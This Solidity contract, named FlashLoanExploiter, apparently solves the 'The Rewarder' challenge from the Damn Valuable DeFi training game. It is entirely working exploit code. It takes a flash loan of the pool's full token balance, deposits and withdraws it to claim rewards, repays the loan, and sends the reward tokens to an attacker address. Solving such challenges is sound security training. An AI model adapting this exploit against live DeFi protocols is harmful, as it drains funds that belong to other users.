// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";


contract FlashLoanExploiter {


    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool theRewarderPool;
    FlashLoanerPool flashLoanPool;
    RewardToken rewardToken;

    address attacker;
    constructor(
        address liquidityTokenAddress, 
        TheRewarderPool _theRewarderPool, 
        FlashLoanerPool _flashLoanPool, 
        address _attacker,
        RewardToken _rewardToken
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        theRewarderPool = _theRewarderPool;
        flashLoanPool = _flashLoanPool;
        attacker = _attacker;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint amount) external {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);

    }

    function exploit() external {
        uint loan_amount = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(loan_amount);
        theRewarderPool.distributeRewards();
        uint balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(attacker, balance);
    }
}